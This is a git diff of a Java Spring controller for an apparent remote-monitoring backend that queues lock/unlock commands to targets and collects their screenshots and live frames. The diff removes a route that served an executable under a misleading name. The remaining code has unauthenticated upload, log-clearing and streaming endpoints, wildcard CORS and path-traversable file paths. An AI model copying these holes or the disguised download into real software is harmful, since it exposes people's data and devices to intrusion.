@@ -4,8 +4,6 @@ import com.guardian.entity.User;
 import com.guardian.repository.UserRepository;
 import com.guardian.service.SecurityService;
 import org.springframework.beans.factory.annotation.Autowired;
-import org.springframework.stereotype.Controller;
-import org.springframework.ui.Model;
 import org.springframework.web.bind.annotation.*;
 
 import java.util.Optional;
@@ -22,7 +20,8 @@ import org.springframework.web.multipart.MultipartFile;
 import com.guardian.repository.LogRepository;
 import com.guardian.entity.LogEntry;
 
-@Controller
+@RestController
+@CrossOrigin(origins = "*") // Allows requests from Vercel
 public class DashboardController {
 
     @Autowired
@@ -43,14 +42,18 @@ public class DashboardController {
         if (!dir.exists()) dir.mkdirs();
     }
 
-    @GetMapping("/dashboard")
-    public String showDashboard(
-            @RequestParam(required = false) String apiKey, 
+    @GetMapping("/api/dashboard-data")
+    public Map<String, Object> getDashboardData(
+            @RequestParam String apiKey, 
             @RequestParam(required = false, defaultValue = "ALL") String targetId, 
-            @RequestParam(required = false, defaultValue = "ADMIN") String role,
-            Model model) {
+            @RequestParam(required = false, defaultValue = "ADMIN") String role) {
+        
+        Map<String, Object> response = new HashMap<>();
+
         if (apiKey == null || apiKey.isEmpty()) {
-            return "POLICE".equalsIgnoreCase(role) ? "redirect:/police/login" : "redirect:/login";
+            response.put("success", false);
+            response.put("message", "Unauthorized");
+            return response;
         }
 
         Optional<User> user = userRepository.findAll().stream()
@@ -58,49 +61,48 @@ public class DashboardController {
                 .findFirst();
 
         if (user.isEmpty()) {
-            return "POLICE".equalsIgnoreCase(role) ? "redirect:/police/login" : "redirect:/login";
+            response.put("success", false);
+            response.put("message", "Unauthorized");
+            return response;
         }
 
-        // Secure Role check: Force the role to be the one configured in the database
         String dbRole = user.get().getRole();
         if (dbRole == null) {
             dbRole = "ADMIN";
         }
-        role = dbRole;
-
-        model.addAttribute("user", user.get());
-        model.addAttribute("role", role.toUpperCase());
+        
+        response.put("success", true);
+        response.put("user", user.get());
+        response.put("role", dbRole.toUpperCase());
         
         List<LogEntry> logs = securityService.getLogsByTargetId(targetId);
-        model.addAttribute("logs", logs);
-        model.addAttribute("targets", securityService.getAllTargetIds());
-        model.addAttribute("currentTarget", targetId);
+        response.put("logs", logs);
+        response.put("targets", securityService.getAllTargetIds());
+        response.put("currentTarget", targetId);
         
         // Police dashboard metrics
         List<User> allUsers = userRepository.findAll();
-        model.addAttribute("users", allUsers);
-        model.addAttribute("totalBreaches", logs.size());
-        model.addAttribute("activeUsers", allUsers.size());
+        response.put("users", allUsers);
+        response.put("totalBreaches", logs.size());
+        response.put("activeUsers", allUsers.size());
         
         long criticalAlerts = logs.stream()
                 .filter(log -> log.getDetails().toLowerCase().contains("kockroach") || 
                                log.getDetails().toLowerCase().contains("spying"))
                 .count();
-        model.addAttribute("criticalAlerts", criticalAlerts);
+        response.put("criticalAlerts", criticalAlerts);
         
         // List screenshots based on targetId
         List<String> fileList = new ArrayList<>();
         if ("ALL".equals(targetId)) {
             java.io.File rootFolder = new java.io.File(UPLOAD_DIR);
             if (rootFolder.exists() && rootFolder.isDirectory()) {
-                // Add files from root
                 java.io.File[] rootFiles = rootFolder.listFiles(f -> !f.isDirectory() && (f.getName().toLowerCase().endsWith(".jpg") || f.getName().toLowerCase().endsWith(".png") || f.getName().toLowerCase().endsWith(".mp4")));
                 if (rootFiles != null) {
                     for (java.io.File f : rootFiles) {
                         fileList.add(f.getName());
                     }
                 }
-                // Add files from dynamic subdirectories
                 java.io.File[] subdirs = rootFolder.listFiles(java.io.File::isDirectory);
                 if (subdirs != null) {
                     for (java.io.File subdir : subdirs) {
@@ -124,26 +126,25 @@ public class DashboardController {
             }
         }
         
-        // Sort chronologically (newest first based on filenames/timestamps)
         fileList.sort((a, b) -> b.compareToIgnoreCase(a));
-        model.addAttribute("screenshots", fileList);
+        response.put("screenshots", fileList);
         
-        return "dashboard";
+        return response;
     }
 
-    @GetMapping("/funny-stuff")
-    public String showDecoy() {
-        return "decoy";
-    }
-
-    @PostMapping("/save-telegram")
-    public String saveTelegram(
+    @PostMapping("/api/save-telegram")
+    public Map<String, Object> saveTelegram(
             @RequestParam String apiKey, 
             @RequestParam String botToken, 
             @RequestParam String chatId,
             @RequestParam(required = false, defaultValue = "ADMIN") String role) {
+        
+        Map<String, Object> response = new HashMap<>();
+
         if ("POLICE".equalsIgnoreCase(role)) {
-            return "redirect:/dashboard?apiKey=" + apiKey + "&role=POLICE&error=unauthorized";
+            response.put("success", false);
+            response.put("message", "Unauthorized for Police role");
+            return response;
         }
 
         Optional<User> user = userRepository.findAll().stream()
@@ -155,14 +156,16 @@ public class DashboardController {
             u.setTelegramBotToken(botToken);
             u.setTelegramChatId(chatId);
             userRepository.save(u);
-            return "redirect:/dashboard?apiKey=" + apiKey + "&role=" + role + "&success";
+            response.put("success", true);
+            response.put("message", "Telegram settings saved");
+            return response;
         }
-        return "redirect:/login";
+        response.put("success", false);
+        response.put("message", "User not found");
+        return response;
     }
 
     @GetMapping("/api/status")
-    @ResponseBody
-    @CrossOrigin
     public java.util.Map<String, Object> getStatus() {
         java.util.Map<String, Object> status = new java.util.HashMap<>();
         status.put("locked", com.guardian.Main.isLocked());
@@ -171,8 +174,6 @@ public class DashboardController {
     }
 
     @PostMapping("/api/kavach/toggle")
-    @ResponseBody
-    @CrossOrigin
     public String toggleKavach(
             @RequestParam boolean active, 
             @RequestParam(required = false) String apiKey, 
@@ -191,8 +192,6 @@ public class DashboardController {
     }
 
     @PostMapping("/api/control")
-    @ResponseBody
-    @CrossOrigin
     public String controlSystem(
             @RequestParam String action, 
             @RequestParam(required = false) String apiKey,
@@ -218,7 +217,6 @@ public class DashboardController {
             uppercaseAction = "UNLOCK";
         }
 
-        // Push command to the specific target queue(s)
         if ("ALL".equalsIgnoreCase(targetId)) {
             for (String tid : targetCommandQueues.keySet()) {
                 targetCommandQueues.computeIfAbsent(tid, k -> new ConcurrentLinkedQueue<>()).add(uppercaseAction);
@@ -233,8 +231,6 @@ public class DashboardController {
     }
 
     @GetMapping("/api/commands/poll")
-    @ResponseBody
-    @CrossOrigin
     public Map<String, String> pollCommands(
             @RequestParam(required = false) String apiKey,
             @RequestParam(required = false, defaultValue = "UNKNOWN") String targetId) {
@@ -248,11 +244,8 @@ public class DashboardController {
                 });
         }
 
-        // Initialize target specific queue if not exists
         targetCommandQueues.putIfAbsent(targetId, new ConcurrentLinkedQueue<>());
 
-        // Dynamic Self-Registration: if we haven't seen this target in logs, write an online event 
-        // to immediately register it in the SQLite database and populate the dashboard dropdown
         if (!"UNKNOWN".equals(targetId)) {
             List<LogEntry> logs = securityService.getLogsByTargetId(targetId);
             if (logs.isEmpty()) {
@@ -269,8 +262,6 @@ public class DashboardController {
     }
 
     @PostMapping("/api/upload")
-    @ResponseBody
-    @CrossOrigin
     public String handleFileUpload(@RequestParam("file") MultipartFile file, @RequestParam(required = false, defaultValue = "UNKNOWN") String targetId) {
         if (file.isEmpty()) return "FAIL";
         try {
@@ -285,8 +276,6 @@ public class DashboardController {
     }
 
     @PostMapping("/api/live-upload")
-    @ResponseBody
-    @CrossOrigin
     public String handleLiveUpload(@RequestParam("file") MultipartFile file, @RequestParam(required = false, defaultValue = "UNKNOWN") String targetId) {
         try {
             java.io.File dir = new java.io.File(UPLOAD_DIR + targetId + "/");
@@ -298,8 +287,6 @@ public class DashboardController {
     }
 
     @GetMapping("/api/live-stream")
-    @ResponseBody
-    @CrossOrigin
     public org.springframework.http.ResponseEntity<?> getLiveStream(@RequestParam(required = false, defaultValue = "UNKNOWN") String targetId) {
         String pathStr = UPLOAD_DIR + targetId + "/live_now.jpg";
         
@@ -321,7 +308,6 @@ public class DashboardController {
 
         java.io.File checkFile = new java.io.File(pathStr);
         if (!checkFile.exists()) {
-            // Return 204 No Content to indicate stream not active yet (prevents broken image box)
             return org.springframework.http.ResponseEntity.noContent().build();
         }
 
@@ -333,49 +319,23 @@ public class DashboardController {
                 .body(resource);
     }
 
-    @PostMapping("/api/login")
-    @ResponseBody
-    @CrossOrigin
-    public java.util.Map<String, Object> apiLogin(@RequestParam String email, @RequestParam String password) {
-        java.util.Map<String, Object> response = new java.util.HashMap<>();
-        Optional<User> user = userRepository.findAll().stream()
-                .filter(u -> u.getEmail().equals(email) && u.getPassword().equals(password))
-                .findFirst();
-        
-        if (user.isPresent()) {
-            response.put("success", true);
-            response.put("apiKey", user.get().getApiKey());
-        } else {
-            response.put("success", false);
-            response.put("message", "Invalid Email or Password");
-        }
-        return response;
-    }
-
     @GetMapping("/api/logs")
-    @ResponseBody
-    @CrossOrigin
     public java.util.List<com.guardian.entity.LogEntry> apiLogs() {
         return securityService.getAllLogs();
     }
 
     @PostMapping("/api/logs/clear")
-    @ResponseBody
-    @CrossOrigin
     public String clearLogs() {
         securityService.clearAllLogs();
         return "LOGS_CLEARED";
     }
 
     @GetMapping("/api/screenshots/{filename}")
-    @ResponseBody
-    @CrossOrigin
     public org.springframework.http.ResponseEntity<org.springframework.core.io.Resource> getScreenshot(@PathVariable String filename, @RequestParam(required = false, defaultValue = "UNKNOWN") String targetId) {
         String path = "ALL".equals(targetId) || "UNKNOWN".equals(targetId) ? UPLOAD_DIR + filename : UPLOAD_DIR + targetId + "/" + filename;
         java.io.File file = new java.io.File(path);
         
         if (!file.exists() && ("ALL".equals(targetId) || "UNKNOWN".equals(targetId))) {
-            // Search in subdirectories
             java.io.File uploadDir = new java.io.File(UPLOAD_DIR);
             if (uploadDir.exists() && uploadDir.isDirectory()) {
                 java.io.File[] dirs = uploadDir.listFiles(java.io.File::isDirectory);
@@ -400,11 +360,5 @@ public class DashboardController {
         return org.springframework.http.ResponseEntity.ok()
                 .contentType(org.springframework.http.MediaType.parseMediaType(contentType))
                 .body(resource);
-    }
-
-    @GetMapping("/3rd-AI-Agent.exe")
-    public String downloadAgent() {
-        // Redirecting to Google Drive direct download of kockroch.exe
-        return "redirect:https://drive.google.com/uc?export=download&id=1PVApeaQzobxZ7UkYYz56MHmI06OojqL7";
     }
 }
